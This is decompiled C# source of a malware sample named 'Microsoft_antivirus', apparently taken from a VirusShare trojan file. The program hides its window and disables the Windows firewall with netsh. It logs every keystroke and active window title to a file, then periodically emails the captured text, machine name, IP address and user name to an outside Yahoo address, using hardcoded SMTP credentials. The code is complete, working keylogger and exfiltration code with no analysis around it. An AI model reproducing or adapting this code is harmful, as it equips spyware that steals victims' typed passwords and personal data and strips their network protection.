// Decompiled with JetBrains decompiler
// Type: Microsoft_antivirus.Form1
// Assembly: Microsoft_antivirus, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 36B8CAE0-3CAF-48B2-801A-E959E019E2EC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.dano-6187c24f63c1386c6f1ae23fdb02fc9c192926ce17adcbd4ee1abbdab181bf38.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft_antivirus.My;
using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Microsoft_antivirus
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static ArrayList __ENCList = new ArrayList();
    private IContainer components;
    [AccessedThroughProperty("tm")]
    private System.Windows.Forms.Timer _tm;
    [AccessedThroughProperty("n")]
    private TextBox _n;
    [AccessedThroughProperty("Button1")]
    private Button _Button1;
    [AccessedThroughProperty("Button2")]
    private Button _Button2;
    [AccessedThroughProperty("st")]
    private TextBox _st;
    [AccessedThroughProperty("tr")]
    private System.Windows.Forms.Timer _tr;
    private Thread k;
    private bool keylogging;
    private string log;
    private int key;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.tm = new System.Windows.Forms.Timer(this.components);
      this.n = new TextBox();
      this.Button1 = new Button();
      this.Button2 = new Button();
      this.st = new TextBox();
      this.tr = new System.Windows.Forms.Timer(this.components);
      this.SuspendLayout();
      this.tm.Interval = 900000;
      TextBox n1 = this.n;
      Point point1 = new Point(26, 194);
      Point point2 = point1;
      n1.Location = point2;
      this.n.Multiline = true;
      this.n.Name = "n";
      this.n.ScrollBars = ScrollBars.Both;
      TextBox n2 = this.n;
      Size size1 = new Size(619, 318);
      Size size2 = size1;
      n2.Size = size2;
      this.n.TabIndex = 0;
      Button button1_1 = this.Button1;
      point1 = new Point(822, 18);
      Point point3 = point1;
      button1_1.Location = point3;
      this.Button1.Name = "Button1";
      Button button1_2 = this.Button1;
      size1 = new Size(75, 23);
      Size size3 = size1;
      button1_2.Size = size3;
      this.Button1.TabIndex = 1;
      this.Button1.Text = "Button1";
      this.Button1.UseVisualStyleBackColor = true;
      Button button2_1 = this.Button2;
      point1 = new Point(598, 165);
      Point point4 = point1;
      button2_1.Location = point4;
      this.Button2.Name = "Button2";
      Button button2_2 = this.Button2;
      size1 = new Size(75, 23);
      Size size4 = size1;
      button2_2.Size = size4;
      this.Button2.TabIndex = 2;
      this.Button2.Text = "Button2";
      this.Button2.UseVisualStyleBackColor = true;
      TextBox st1 = this.st;
      point1 = new Point(302, 173);
      Point point5 = point1;
      st1.Location = point5;
      this.st.Name = "st";
      TextBox st2 = this.st;
      size1 = new Size(100, 20);
      Size size5 = size1;
      st2.Size = size5;
      this.st.TabIndex = 3;
      this.tr.Interval = 300;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(12, 10);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.st);
      this.Controls.Add((Control) this.Button2);
      this.Controls.Add((Control) this.Button1);
      this.Controls.Add((Control) this.n);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.Manual;
      this.TransparencyKey = SystemColors.Control;
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual System.Windows.Forms.Timer tm
    {
      [DebuggerNonUserCode] get => this._tm;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._tm != null)
          this._tm.Tick -= new EventHandler(this.tm_Tick);
        this._tm = value;
        if (this._tm == null)
          return;
        this._tm.Tick += new EventHandler(this.tm_Tick);
      }
    }

    internal virtual TextBox n
    {
      [DebuggerNonUserCode] get => this._n;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._n = value;
    }

    internal virtual Button Button1
    {
      [DebuggerNonUserCode] get => this._Button1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Button1 = value;
    }

    internal virtual Button Button2
    {
      [DebuggerNonUserCode] get => this._Button2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Button2 = value;
    }

    internal virtual TextBox st
    {
      [DebuggerNonUserCode] get => this._st;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._st = value;
    }

    internal virtual System.Windows.Forms.Timer tr
    {
      [DebuggerNonUserCode] get => this._tr;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._tr != null)
          this._tr.Tick -= new EventHandler(this.tr_Tick);
        this._tr = value;
        if (this._tr == null)
          return;
        this._tr.Tick += new EventHandler(this.tr_Tick);
      }
    }

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern short GetAsyncKeyState(short vKey);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern short GetForegroundWindow();

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern long GetActiveWindow();

    [DllImport("user32", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern uint GetWindowText(ushort hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, ushort cch);

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      Form1.__ENCList.Add((object) new WeakReference((object) this));
      this.k = new Thread(new ThreadStart(this.keylog));
      this.InitializeComponent();
      Process process = new Process();
      string str = "netsh.exe";
      process.StartInfo.Arguments = "firewall set opmode disable";
      process.StartInfo.FileName = str;
      process.StartInfo.UseShellExecute = false;
      process.StartInfo.RedirectStandardOutput = true;
      process.StartInfo.CreateNoWindow = true;
      process.Start();
      process.WaitForExit();
    }

    private void keylog()
    {
      try
      {
        this.keylogging = true;
        InputLanguage currentInputLanguage = InputLanguage.CurrentInputLanguage;
        do
        {
          this.key = 5;
          do
          {
            if (Form1.GetAsyncKeyState(checked ((short) this.key)) == (short) -32767)
            {
              string lpString = new string(char.MinValue, 100);
              int windowText = (int) Form1.GetWindowText(checked ((ushort) Form1.GetForegroundWindow()), ref lpString, (ushort) 100);
              lpString = lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
              string Left;
              if (Operators.CompareString(Left, lpString, false) != 0)
              {
                this.log = this.log + "\r\n\r\n" + Conversions.ToString(DateAndTime.Now) + "===========[" + lpString + "==================]\r\n\r\n";
                Left = lpString;
              }
              if (MyProject.Computer.Keyboard.CtrlKeyDown)
              {
                if (this.key == 65)
                  this.log += "[CTLa]";
                else if (this.key == 67)
                  this.log += "[CTLc]";
                else if (this.key == 86)
                  this.log += "[CTLv]";
                else if (this.key == 88)
                  this.log += "[CTLx]";
                else if (this.key == 90)
                  this.log += "[CTLz]";
              }
              else if (MyProject.Computer.Keyboard.ShiftKeyDown & MyProject.Computer.Keyboard.CapsLock)
              {
                if (this.key == 49)
                  this.log += "!";
                else if (this.key == 50)
                  this.log = Operators.CompareString(currentInputLanguage.Culture.EnglishName, "English (United Kingdom)", false) != 0 ? this.log + "@" : this.log + "\"";
                else if (this.key == 51)
                  this.log = Operators.CompareString(currentInputLanguage.Culture.EnglishName, "English (United Kingdom)", false) != 0 ? this.log + "#" : this.log + "[PND]";
                else if (this.key == 52)
                  this.log += "$";
                else if (this.key == 53)
                  this.log += "%";
                else if (this.key == 54)
                  this.log += "^";
                else if (this.key == 55)
                  this.log += "&";
                else if (this.key == 56)
                  this.log += "*";
                else if (this.key == 57)
                  this.log += "(";
                else if (this.key == 48)
                  this.log += ")";
                else if (this.key == 65)
                  this.log += "ا";
                else if (this.key == 66)
                  this.log += "b";
                else if (this.key == 67)
                  this.log += "c";
                else if (this.key == 68)
                  this.log += "d";
                else if (this.key == 69)
                  this.log += "e";
                else if (this.key == 70)
                  this.log += "f";
                else if (this.key == 71)
                  this.log += "g";
                else if (this.key == 72)
                  this.log += "h";
                else if (this.key == 73)
                  this.log += "i";
                else if (this.key == 74)
                  this.log += "j";
                else if (this.key == 75)
                  this.log += "k";
                else if (this.key == 76)
                  this.log += "l";
                else if (this.key == 77)
                  this.log += "m";
                else if (this.key == 78)
                  this.log += "n";
                else if (this.key == 79)
                  this.log += "o";
                else if (this.key == 80)
                  this.log += "p";
                else if (this.key == 81)
                  this.log += "q";
                else if (this.key == 82)
                  this.log += "r";
                else if (this.key == 83)
                  this.log += "s";
                else if (this.key == 84)
                  this.log += "t";
                else if (this.key == 85)
                  this.log += "u";
                else if (this.key == 86)
                  this.log += "v";
                else if (this.key == 87)
                  this.log += "w";
                else if (this.key == 88)
                  this.log += "x";
                else if (this.key == 89)
                  this.log += "y";
                else if (this.key == 90)
                  this.log += "z";
                else if (this.key == 188)
                  this.log += "<";
                else if (this.key == 189)
                  this.log += "_";
                else if (this.key == 187)
                  this.log += "=";
                else if (this.key == 219)
                  this.log += "{";
                else if (this.key == 221)
                  this.log += "}";
                else if (this.key == 191)
                  this.log += "?";
                else if (this.key == 220)
                  this.log += "|";
                else if (this.key == 186)
                  this.log += ":";
                else if (this.key == 190)
                  this.log += ">";
                else if (this.key == 192)
                  this.log = Operators.CompareString(currentInputLanguage.Culture.EnglishName, "English (United Kingdom)", false) != 0 ? this.log + "~" : this.log + "@";
                else if (this.key == 222)
                  this.log = Operators.CompareString(currentInputLanguage.Culture.EnglishName, "English (United Kingdom)", false) != 0 ? this.log + "\"" : this.log + "~";
                else if (this.key == 37)
                  this.log += "[sLFT]";
                else if (this.key == 39)
                  this.log += "[sRHT]";
                else if (this.key == 45)
                  this.log += "[CTLv]";
                else if (this.key == 36)
                  this.log += "[sHME]";
                else if (this.key == 35)
                  this.log += "[sEND]";
                else if (this.key == 187)
                  this.log += "+";
                else if (this.key == 223)
                  this.log += "[TIL]";
              }
              else if (MyProject.Computer.Keyboard.ShiftKeyDown & !MyProject.Computer.Keyboard.CapsLock)
              {
                if (this.key == 49)
                  this.log += "!";
                else if (this.key == 50)
                  this.log = Operators.CompareString(currentInputLanguage.Culture.EnglishName, "English (United Kingdom)", false) != 0 ? this.log + "@" : this.log + "\"";
                else if (this.key == 51)
                  this.log = Operators.CompareString(currentInputLanguage.Culture.EnglishName, "English (United Kingdom)", false) != 0 ? this.log + "#" : this.log + "[PND]";
                else if (this.key == 52)
                  this.log += "$";
                else if (this.key == 53)
                  this.log += "%";
                else if (this.key == 54)
                  this.log += "^";
                else if (this.key == 55)
                  this.log += "&";
                else if (this.key == 56)
                  this.log += "*";
                else if (this.key == 57)
                  this.log += "(";
                else if (this.key == 48)
                  this.log += ")";
                else if (this.key == 65)
                  this.log += "A";
                else if (this.key == 66)
                  this.log += "B";
                else if (this.key == 67)
                  this.log += "C";
                else if (this.key == 68)
                  this.log += "D";
                else if (this.key == 69)
                  this.log += "E";
                else if (this.key == 70)
                  this.log += "F";
                else if (this.key == 71)
                  this.log += "G";
                else if (this.key == 72)
                  this.log += "H";
                else if (this.key == 73)
                  this.log += "I";
                else if (this.key == 74)
                  this.log += "J";
                else if (this.key == 75)
                  this.log += "K";
                else if (this.key == 76)
                  this.log += "L";
                else if (this.key == 77)
                  this.log += "M";
                else if (this.key == 78)
                  this.log += "N";
                else if (this.key == 79)
                  this.log += "O";
                else if (this.key == 80)
                  this.log += "P";
                else if (this.key == 81)
                  this.log += "Q";
                else if (this.key == 82)
                  this.log += "R";
                else if (this.key == 83)
                  this.log += "S";
                else if (this.key == 84)
                  this.log += "T";
                else if (this.key == 85)
                  this.log += "U";
                else if (this.key == 86)
                  this.log += "V";
                else if (this.key == 87)
                  this.log += "W";
                else if (this.key == 88)
                  this.log += "X";
                else if (this.key == 89)
                  this.log += "Y";
                else if (this.key == 90)
                  this.log += "Z";
                else if (this.key == 188)
                  this.log += "<";
                else if (this.key == 189)
                  this.log += "_";
                else if (this.key == 187)
                  this.log += "=";
                else if (this.key == 219)
                  this.log += "{";
                else if (this.key == 221)
                  this.log += "}";
                else if (this.key == 191)
                  this.log += "?";
                else if (this.key == 220)
                  this.log += "|";
                else if (this.key == 186)
                  this.log += ":";
                else if (this.key == 190)
                  this.log += ">";
                else if (this.key == 192)
                  this.log = Operators.CompareString(currentInputLanguage.Culture.EnglishName, "English (United Kingdom)", false) != 0 ? this.log + "~" : this.log + "@";
                else if (this.key == 8)
                  this.log += "[BAK]";
                else if (this.key == 37)
                  this.log += "[sLFT]";
                else if (this.key == 39)
                  this.log += "[sRHT]";
                else if (this.key == 45)
                  this.log += "[CTLv]";
                else if (this.key == 36)
                  this.log += "[sHME]";
                else if (this.key == 35)
                  this.log += "[sEND]";
                else if (this.key == 187)
                  this.log += "+";
                else if (this.key == 222)
                  this.log = Operators.CompareString(currentInputLanguage.Culture.EnglishName, "English (United Kingdom)", false) != 0 ? this.log + "\"" : this.log + "~";
                else if (this.key == 223)
                  this.log += "[TIL]";
              }
              else if (!MyProject.Computer.Keyboard.ShiftKeyDown & !MyProject.Computer.Keyboard.CapsLock)
              {
                if (this.key == 65)
                  this.log += "a";
                else if (this.key == 66)
                  this.log += "b";
                else if (this.key == 67)
                  this.log += "c";
                else if (this.key == 68)
                  this.log += "d";
                else if (this.key == 69)
                  this.log += "e";
                else if (this.key == 70)
                  this.log += "f";
                else if (this.key == 71)
                  this.log += "g";
                else if (this.key == 72)
                  this.log += "h";
                else if (this.key == 73)
                  this.log += "i";
                else if (this.key == 74)
                  this.log += "j";
                else if (this.key == 75)
                  this.log += "k";
                else if (this.key == 76)
                  this.log += "l";
                else if (this.key == 77)
                  this.log += "m";
                else if (this.key == 78)
                  this.log += "n";
                else if (this.key == 79)
                  this.log += "o";
                else if (this.key == 80)
                  this.log += "p";
                else if (this.key == 81)
                  this.log += "q";
                else if (this.key == 82)
                  this.log += "r";
                else if (this.key == 83)
                  this.log += "s";
                else if (this.key == 84)
                  this.log += "t";
                else if (this.key == 85)
                  this.log += "u";
                else if (this.key == 86)
                  this.log += "v";
                else if (this.key == 87)
                  this.log += "w";
                else if (this.key == 88)
                  this.log += "x";
                else if (this.key == 89)
                  this.log += "y";
                else if (this.key == 90)
                  this.log += "z";
                else if (this.key == 48)
                  this.log += "0";
                else if (this.key == 49)
                  this.log += "1";
                else if (this.key == 50)
                  this.log += "2";
                else if (this.key == 51)
                  this.log += "3";
                else if (this.key == 52)
                  this.log += "4";
                else if (this.key == 53)
                  this.log += "5";
                else if (this.key == 54)
                  this.log += "6";
                else if (this.key == 55)
                  this.log += "7";
                else if (this.key == 56)
                  this.log += "8";
                else if (this.key == 57)
                  this.log += "9";
                else if (this.key == 96)
                  this.log += "0";
                else if (this.key == 97)
                  this.log += "1";
                else if (this.key == 98)
                  this.log += "2";
                else if (this.key == 99)
                  this.log += "3";
                else if (this.key == 100)
                  this.log += "4";
                else if (this.key == 101)
                  this.log += "5";
                else if (this.key == 102)
                  this.log += "6";
                else if (this.key == 103)
                  this.log += "7";
                else if (this.key == 104)
                  this.log += "8";
                else if (this.key == 105)
                  this.log += "9";
                else if (this.key == 188)
                  this.log += ",";
                else if (this.key == 189)
                  this.log += "-";
                else if (this.key == 187)
                  this.log += "=";
                else if (this.key == 222)
                  this.log = Operators.CompareString(currentInputLanguage.Culture.EnglishName, "English (United Kingdom)", false) != 0 ? this.log + "'" : this.log + "#";
                else if (this.key == 219)
                  this.log += "[";
                else if (this.key == 221)
                  this.log += "]";
                else if (this.key == 191)
                  this.log += "/";
                else if (this.key == 220)
                  this.log += "\\";
                else if (this.key == 186)
                  this.log += ";";
                else if (this.key == 190)
                  this.log += ".";
                else if (this.key == 192)
                  this.log = Operators.CompareString(currentInputLanguage.Culture.EnglishName, "English (United Kingdom)", false) != 0 ? this.log + "`" : this.log + "'";
                else if (this.key == 32)
                  this.log += " ";
                else if (this.key == 13)
                  this.log += "\r\n";
                else if (this.key == 46)
                  this.log += "[DEL]";
                else if (this.key == 8)
                  this.log += "[BAK]";
                else if (this.key == 37)
                  this.log += "[LFT]";
                else if (this.key == 39)
                  this.log += "[RHT]";
                else if (this.key == 9)
                  this.log += "[TAB]";
                else if (this.key == 36)
                  this.log += "[HME]";
                else if (this.key == 35)
                  this.log += "[END]";
                else if (this.key == 111)
                  this.log += "/";
                else if (this.key == 110)
                  this.log += ".";
                else if (this.key == 109)
                  this.log += "-";
                else if (this.key == 107)
                  this.log += "+";
                else if (this.key == 106)
                  this.log += "*";
                else if (this.key == 223)
                  this.log += "`";
              }
              else if (!MyProject.Computer.Keyboard.ShiftKeyDown & MyProject.Computer.Keyboard.CapsLock)
              {
                if (this.key == 65)
                  this.log += "A";
                else if (this.key == 66)
                  this.log += "B";
                else if (this.key == 67)
                  this.log += "C";
                else if (this.key == 68)
                  this.log += "D";
                else if (this.key == 69)
                  this.log += "E";
                else if (this.key == 70)
                  this.log += "F";
                else if (this.key == 71)
                  this.log += "G";
                else if (this.key == 72)
                  this.log += "H";
                else if (this.key == 73)
                  this.log += "I";
                else if (this.key == 74)
                  this.log += "J";
                else if (this.key == 75)
                  this.log += "K";
                else if (this.key == 76)
                  this.log += "L";
                else if (this.key == 77)
                  this.log += "M";
                else if (this.key == 78)
                  this.log += "N";
                else if (this.key == 79)
                  this.log += "O";
                else if (this.key == 80)
                  this.log += "P";
                else if (this.key == 81)
                  this.log += "Q";
                else if (this.key == 82)
                  this.log += "R";
                else if (this.key == 83)
                  this.log += "S";
                else if (this.key == 84)
                  this.log += "T";
                else if (this.key == 85)
                  this.log += "U";
                else if (this.key == 86)
                  this.log += "V";
                else if (this.key == 87)
                  this.log += "W";
                else if (this.key == 88)
                  this.log += "X";
                else if (this.key == 89)
                  this.log += "Y";
                else if (this.key == 90)
                  this.log += "Z";
                else if (this.key == 48)
                  this.log += "0";
                else if (this.key == 49)
                  this.log += "1";
                else if (this.key == 50)
                  this.log += "2";
                else if (this.key == 51)
                  this.log += "3";
                else if (this.key == 52)
                  this.log += "4";
                else if (this.key == 53)
                  this.log += "5";
                else if (this.key == 54)
                  this.log += "6";
                else if (this.key == 55)
                  this.log += "7";
                else if (this.key == 56)
                  this.log += "8";
                else if (this.key == 57)
                  this.log += "9";
                else if (this.key == 96)
                  this.log += "0";
                else if (this.key == 97)
                  this.log += "1";
                else if (this.key == 98)
                  this.log += "2";
                else if (this.key == 99)
                  this.log += "3";
                else if (this.key == 100)
                  this.log += "4";
                else if (this.key == 101)
                  this.log += "5";
                else if (this.key == 102)
                  this.log += "6";
                else if (this.key == 103)
                  this.log += "7";
                else if (this.key == 104)
                  this.log += "8";
                else if (this.key == 105)
                  this.log += "9";
                else if (this.key == 188)
                  this.log += ",";
                else if (this.key == 189)
                  this.log += "-";
                else if (this.key == 187)
                  this.log += "=";
                else if (this.key == 222)
                  this.log = Operators.CompareString(currentInputLanguage.Culture.EnglishName, "English (United Kingdom)", false) != 0 ? this.log + "'" : this.log + "#";
                else if (this.key == 219)
                  this.log += "[";
                else if (this.key == 221)
                  this.log += "]";
                else if (this.key == 191)
                  this.log += "/";
                else if (this.key == 220)
                  this.log += "\\";
                else if (this.key == 186)
                  this.log += ";";
                else if (this.key == 190)
                  this.log += ".";
                else if (this.key == 192)
                  this.log = Operators.CompareString(currentInputLanguage.Culture.EnglishName, "English (United Kingdom)", false) != 0 ? this.log + "`" : this.log + "'";
                else if (this.key == 32)
                  this.log += " ";
                else if (this.key == 13)
                  this.log += "\r\n";
                else if (this.key == 46)
                  this.log += "[DEL]";
                else if (this.key == 8)
                  this.log += "[BAK]";
                else if (this.key == 37)
                  this.log += "[LFT]";
                else if (this.key == 39)
                  this.log += "[RHT]";
                else if (this.key == 9)
                  this.log += "[TAB]";
                else if (this.key == 36)
                  this.log += "[HME]";
                else if (this.key == 35)
                  this.log += "[END]";
                else if (this.key == 111)
                  this.log += "/";
                else if (this.key == 110)
                  this.log += ".";
                else if (this.key == 109)
                  this.log += "-";
                else if (this.key == 107)
                  this.log += "+";
                else if (this.key == 106)
                  this.log += "*";
                else if (this.key == 223)
                  this.log += "`";
              }
              this.n.Text += this.log;
              MyProject.Computer.FileSystem.WriteAllText(Application.StartupPath + "\\catlog.txt", this.log, true);
              this.log = "";
            }
            checked { ++this.key; }
          }
          while (this.key <= (int) byte.MaxValue);
        }
        while (this.keylogging);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      try
      {
        Control.CheckForIllegalCrossThreadCalls = false;
        this.k.Start();
        this.tm.Enabled = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public string get_enc(string n)
    {
      string enc;
      try
      {
        enc = new ASCIIEncoding().GetString(Convert.FromBase64String(n));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return enc;
    }

    public void wr()
    {
      try
      {
        StreamWriter streamWriter = new StreamWriter((Stream) new FileStream(Application.StartupPath + "\\catlog.txt", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.None));
        streamWriter.WriteLine(this.log);
        this.log = "";
        streamWriter.Flush();
        streamWriter.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void tm_Tick(object sender, EventArgs e)
    {
      try
      {
        Process process = new Process();
        string str = "netsh.exe";
        process.StartInfo.Arguments = "firewall set opmode disable";
        process.StartInfo.FileName = str;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.CreateNoWindow = true;
        process.Start();
        process.WaitForExit();
        int minor = Environment.OSVersion.Version.Minor;
        string osFullName = MyProject.Computer.Info.OSFullName;
        IPAddress[] addressList = Dns.GetHostByName(Dns.GetHostName()).AddressList;
        SmtpClient smtpClient = new SmtpClient("smtp.mail.yahoo.com");
        smtpClient.UseDefaultCredentials = true;
        smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential("fox_cat5@yahoo.com", "catcat");
        smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
        MailMessage message = new MailMessage("fox_cat5@yahoo.com", "sah_catx@yahoo.com");
        message.Subject = Environment.MachineName + "  ";
        int index;
        message.Body = "information from target\r\n========================================\r\n\r\ncomputer name =  " + Environment.MachineName + "\r\nIP Address =  (" + Conversions.ToString(index) + ") " + addressList[index].ToString() + "\r\nuser domain name =  " + Environment.UserDomainName + "\r\nuser name =  " + Environment.UserName + "\r\nos=  " + osFullName + "\r\n==========================================================================\r\n\r\n" + this.n.Text;
        smtpClient.Timeout = 3000000;
        smtpClient.Send(message);
      }
      catch (SmtpException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        int minor = Environment.OSVersion.Version.Minor;
        string osFullName = MyProject.Computer.Info.OSFullName;
        IPAddress[] addressList = Dns.GetHostByName(Dns.GetHostName()).AddressList;
        int index;
        new SmtpClient("smtp.mail.yahoo.com")
        {
          UseDefaultCredentials = true,
          Credentials = ((ICredentialsByHost) new NetworkCredential("fox_cat6@yahoo.com", "catcat")),
          DeliveryMethod = SmtpDeliveryMethod.Network
        }.Send(new MailMessage("fox_cat6@yahoo.com", "sah_catx@yahoo.com")
        {
          Subject = Environment.MachineName,
          Body = "information from target\r\n========================================\r\n\r\ncomputer name =  " + Environment.MachineName + "\r\nIP Address =  (" + Conversions.ToString(index) + ") " + addressList[index].ToString() + "\r\nuser domain name =  " + Environment.UserDomainName + "\r\nuser name =  " + Environment.UserName + "\r\nos=  " + osFullName + "\r\n==========================================================================\r\n\r\n" + this.n.Text
        });
        ProjectData.ClearProjectError();
      }
      catch (ArgumentOutOfRangeException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        this.tm.Start();
        ProjectData.ClearProjectError();
      }
    }

    public void wrf()
    {
      try
      {
        FileStream fileStream = new FileStream(Application.StartupPath + "\\catlog.txt", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite);
        StreamWriter streamWriter = new StreamWriter((Stream) fileStream);
        streamWriter.Write(this.log);
        streamWriter.Flush();
        fileStream.Close();
        streamWriter.Close();
        fileStream.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void wr_Tick(object sender, EventArgs e)
    {
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void f_Tick(object sender, EventArgs e)
    {
      try
      {
        MyProject.Computer.FileSystem.WriteAllText(Application.StartupPath + "\\catlog.txt", this.log, false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void tmm_Tick(object sender, EventArgs e)
    {
      try
      {
        MyProject.Computer.FileSystem.WriteAllText(Application.StartupPath + "\\catlog.txt", this.log, true);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void tr_Tick(object sender, EventArgs e)
    {
      try
      {
        MyProject.Computer.FileSystem.WriteAllText(Application.StartupPath + "\\catlog.txt", this.n.Text, true);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ex.ToString());
        ProjectData.ClearProjectError();
      }
    }
  }
}
